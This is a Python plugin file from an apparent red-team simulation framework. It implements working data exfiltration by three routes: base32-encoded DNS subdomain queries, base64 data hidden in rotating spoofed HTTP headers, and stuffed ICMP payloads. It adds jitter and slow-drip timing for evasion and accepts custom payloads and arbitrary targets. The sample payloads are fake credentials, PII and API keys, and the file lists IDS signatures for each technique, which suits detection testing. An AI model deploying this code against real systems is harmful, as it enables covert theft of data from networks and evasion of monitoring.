#!/usr/bin/env python3
# agent/plugins/exfil_plugin.py
# =============================================================================
#  MIAT Plugin — Data Exfiltration Simulation
#
#  Change from original:
#    execute() now extracts task_id from args and includes it in the
#    summary dict posted to /api/agent/exfil/results/.  This allows
#    api_exfil_results() on the server to call _close_moduletask_loop(),
#    completing the web-dispatch tracking cycle.
#
#  Server command format:
#  {
#    "command": "exfil",
#    "args": {
#      "technique":    "dns",
#      "profile":      "burst",
#      "target":       "192.168.1.1",
#      "payload_type": "credentials",
#      "dns_domain":   "exfil-test.local",
#      "drip_interval": 10.0,
#      "jitter_min":   1.0,
#      "jitter_max":   8.0,
#      "task_id":      "uuid-string"   ← injected by dispatch_exfil_task
#    }
#  }
# =============================================================================

import asyncio
import base64
import hashlib
import random
import time
from datetime import datetime, timezone

from plugin_base import MIATPlugin

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import dns.resolver
    import dns.exception
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    from scapy.all import IP, ICMP, send, conf
    conf.verb = 0
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


PAYLOADS = {
    'credentials': "username=admin&password=P@ssw0rd123&token=eyJhbGciOiJSUzI1NiJ9",
    'pii':         "name=John Doe,dob=1990-01-15,ssn=123-45-6789,email=john@example.com",
    'api_key':     "api_key=AKIA1234567890ABCDEF&secret=wJalrXUtnFEMI/K7MDENG/bPxRfiCY",
    'db_dump':     "id,name,email\n1,Alice,alice@ex.com\n2,Bob,bob@ex.com",
    'config':      "DB_HOST=192.168.1.100\nDB_PASS=SuperSecret!\nSECRET_KEY=abc123",
}

CHUNK_SIZES = {'dns': 20, 'http': 100, 'icmp': 64}

HEADER_CYCLE = [
    ('User-Agent',     'Mozilla/5.0 AppleWebKit/537.36 {}'),
    ('X-Request-ID',   '{}'),
    ('Referer',        'https://cdn.cloudflare.com/assets/{}'),
    ('Accept-Language','en-US,en;q=0.9,{}'),
]


class ExfilPlugin(MIATPlugin):

    @property
    def name(self) -> str:
        return 'exfil'

    @property
    def version(self) -> str:
        return '1.0.0'

    @property
    def description(self) -> str:
        return 'Data exfiltration simulation — DNS/HTTP/ICMP'

    async def execute(self, args: dict) -> None:
        technique     = args.get('technique',     'dns')
        profile       = args.get('profile',       'burst')
        target        = args.get('target',        '192.168.1.1')
        payload_type  = args.get('payload_type',  'credentials')
        custom        = args.get('payload',       '')
        dns_domain    = args.get('dns_domain',    'exfil-test.local')
        dns_server    = args.get('dns_server',    None)
        http_target   = args.get('http_target',   f'http://{target}')
        drip_interval = float(args.get('drip_interval', 10.0))
        jitter_min    = float(args.get('jitter_min',    1.0))
        jitter_max    = float(args.get('jitter_max',    8.0))

        # ── task_id forwarded from dispatch_exfil_task via channel_layer ──────
        # Included verbatim in the summary so api_exfil_results() can look up
        # the ModuleTask and call mark_complete(result.pk).
        task_id = str(args.get('task_id', ''))

        # Validate technique availability
        if technique == 'http' and not REQUESTS_AVAILABLE:
            await self._emit(
                data={'error': 'pip install requests', 'task_id': task_id},
                success=False,
            )
            return
        if technique == 'dns' and not DNS_AVAILABLE:
            await self._emit(
                data={'error': 'pip install dnspython', 'task_id': task_id},
                success=False,
            )
            return
        if technique == 'icmp' and not SCAPY_AVAILABLE:
            await self._emit(
                data={'error': 'pip install scapy + Npcap (Windows)', 'task_id': task_id},
                success=False,
            )
            return

        # Build payload
        payload = custom if custom else PAYLOADS.get(payload_type, PAYLOADS['credentials'])
        run_id  = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        payload = f"[MIAT-SIM][{run_id}] {payload}"

        # Split into chunks
        chunk_size = CHUNK_SIZES.get(technique, 20)
        raw_bytes  = payload.encode('utf-8')
        chunks     = [
            raw_bytes[i:i + chunk_size]
            for i in range(0, len(raw_bytes), chunk_size)
        ]
        total = len(chunks)

        await self._emit_live(
            f"EXFIL [{technique.upper()}][{profile.upper()}] — "
            f"{len(raw_bytes)}B → {total} chunks → {target}"
        )

        loop       = asyncio.get_event_loop()
        packets    = []
        successful = 0
        errors     = 0
        session_id = run_id
        hdr_idx    = 0
        start_time = time.time()

        for i, chunk in enumerate(chunks, start=1):
            if self._stop_event.is_set():
                break

            if technique == 'dns':
                result = await loop.run_in_executor(
                    None,
                    lambda c=chunk, seq=i: self._send_dns(
                        c, seq, session_id, dns_domain, dns_server,
                    ),
                )
            elif technique == 'http':
                result = await loop.run_in_executor(
                    None,
                    lambda c=chunk, seq=i, hi=hdr_idx: self._send_http(
                        c, seq, hi, http_target,
                    ),
                )
                hdr_idx += 1
            elif technique == 'icmp':
                result = await loop.run_in_executor(
                    None,
                    lambda c=chunk, seq=i: self._send_icmp(c, seq, target),
                )
            else:
                result = {'error': f'Unknown technique: {technique}'}

            if result.get('error'):
                errors += 1
            else:
                successful += 1

            result['sequence']  = i
            result['timestamp'] = datetime.now(tz=timezone.utc).isoformat()
            packets.append(result)

            desc   = (
                result.get('query_domain')
                or result.get('header_name')
                or target
            )
            status = (
                result.get('outcome')
                or str(result.get('http_status', ''))
                or ('SENT' if result.get('sent') else 'ERR')
            )
            await self._emit_live(
                f"[{i:02d}/{total}] {technique.upper()} "
                f"{str(desc)[:55]} → {status}"
            )

            if i < total and not self._stop_event.is_set():
                if profile == 'burst':
                    await asyncio.sleep(0.05)
                elif profile == 'slow_drip':
                    await asyncio.sleep(drip_interval)
                elif profile == 'jitter':
                    await asyncio.sleep(random.uniform(jitter_min, jitter_max))

        duration = round(time.time() - start_time, 2)

        summary = {
            'technique':        technique,
            'profile':          profile,
            'target':           target,
            'total_chunks':     total,
            'successful':       successful,
            'errors':           errors,
            'duration_sec':     duration,
            'avg_interval_sec': round(duration / max(total - 1, 1), 2),
            'ids_severity':     'HIGH' if technique in ('dns', 'icmp') else 'MEDIUM',
            'ids_signatures':   self._signatures(technique),
            'packets':          packets,
            # ── NEW ──────────────────────────────────────────────────────────
            # Carry task_id through to api_exfil_results() so it can close
            # the ModuleTask tracking loop via _close_moduletask_loop().
            'task_id':          task_id,
        }

        await self._emit_live(
            f"Exfil complete — {successful}/{total} sent in {duration}s"
        )
        await self._emit(data=summary, endpoint='/api/agent/exfil/results/')

    # ── Transport helpers ─────────────────────────────────────────────────────

    def _send_dns(self, chunk: bytes, seq: int,
                  session_id: str, domain: str, dns_server) -> dict:
        encoded = base64.b32encode(chunk).decode().rstrip('=').lower()
        query   = f"{encoded}.{seq:03d}.{session_id}.{domain}"
        resolver          = dns.resolver.Resolver()
        resolver.timeout  = 3
        resolver.lifetime = 3
        if dns_server:
            resolver.nameservers = [dns_server]
        try:
            resolver.resolve(query, 'A')
            outcome = 'RESOLVED'
        except dns.resolver.NXDOMAIN:
            outcome = 'NXDOMAIN'
        except dns.exception.Timeout:
            outcome = 'TIMEOUT'
        except Exception as exc:
            return {'error': str(exc), 'query_domain': query}
        return {
            'query_domain':  query,
            'encoded_label': encoded,
            'label_length':  len(encoded),
            'raw_bytes':     len(chunk),
            'outcome':       outcome,
        }

    def _send_http(self, chunk: bytes, seq: int,
                   hdr_idx: int, target: str) -> dict:
        encoded    = base64.b64encode(chunk).decode()
        name, tmpl = HEADER_CYCLE[hdr_idx % len(HEADER_CYCLE)]
        value      = tmpl.format(encoded)
        headers    = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept':     'text/html',
            name:         value,
            'X-Seq':      str(seq),
        }
        try:
            resp = requests.get(
                target, headers=headers, timeout=5,
                verify=False, allow_redirects=True,
            )
            return {
                'header_name':  name,
                'header_value': value[:80],
                'http_status':  resp.status_code,
                'raw_bytes':    len(chunk),
            }
        except Exception as exc:
            return {
                'header_name': name,
                'error':       str(exc),
                'http_status': 0,
            }

    def _send_icmp(self, chunk: bytes, seq: int, target: str) -> dict:
        seq_hdr = f"[SEQ:{seq:03d}]".encode()
        payload = seq_hdr + chunk
        try:
            pkt = IP(dst=target) / ICMP(type=8, code=0, seq=seq) / payload
            send(pkt)
            return {
                'target_ip':     target,
                'payload_bytes': len(payload),
                'excess_bytes':  len(payload) - 8,
                'sent':          True,
            }
        except PermissionError:
            return {
                'error': 'Permission denied — run as Administrator/sudo',
                'sent':  False,
            }
        except Exception as exc:
            return {'error': str(exc), 'sent': False}

    def _signatures(self, technique: str) -> list:
        sigs = {
            'dns': [
                'Unusually long subdomain labels (>30 chars)',
                'High query volume to single parent domain',
                'Base32 character pattern in subdomains',
            ],
            'http': [
                'Non-standard User-Agent with high entropy',
                'Unusual custom header values',
                'Repeated requests with base64-like content',
            ],
            'icmp': [
                'ICMP payload larger than standard 8 bytes',
                'Non-zero ICMP payload content',
                'Repeated ICMP to single destination',
            ],
        }
        return sigs.get(technique, [])